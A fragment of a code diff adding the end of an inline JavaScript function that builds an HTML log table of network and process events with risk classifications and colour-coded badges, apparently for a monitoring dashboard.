+        var fc = FACTOR_COLORS[riskFactors[f]] || '#7a8fa0';
+        factorsHtml += '<span style="background:' + fc + '22;color:' + fc + ';border:1px solid ' + fc + '44;padding:1px 5px;border-radius:3px;font-size:10px;margin-right:3px;display:inline-block">' + esc(riskFactors[f]) + '</span>';
+      }
+      if (!factorsHtml) factorsHtml = '<span style="color:var(--text-muted)">—</span>';
+
+      html += '<tr class="log-row" style="border-left:3px solid ' + (CLASS_COLORS[classification]||'#7a8fa0') + '">' +
+        '<td class="log-time">' + time + '</td>' +
+        '<td><span class="risk-badge" style="background:' + (CLASS_COLORS[classification]||'#7a8fa0') + '22;color:' + (CLASS_COLORS[classification]||'#7a8fa0') + '">' + (CLASS_LABELS[classification]||classification) + '</span></td>' +
+        '<td><span class="badge ' + (cat==='net'?'badge-net':'badge-proc') + '">' + (cat==='net'?'NET':'PROC') + '</span></td>' +
+        '<td class="log-detail">' + sourceHtml + '</td>' +
+        '<td class="log-detail">' + details + '</td>' +
+        '<td class="log-detail">' + factorsHtml + '</td>' +
+        '<td class="log-size">' + size + '</td>' +
+        '</tr>';
+    }
+    elLogBody.innerHTML = html;
+  }
+  renderLog();
+
+})();
+</script>
+</body>
+</html>
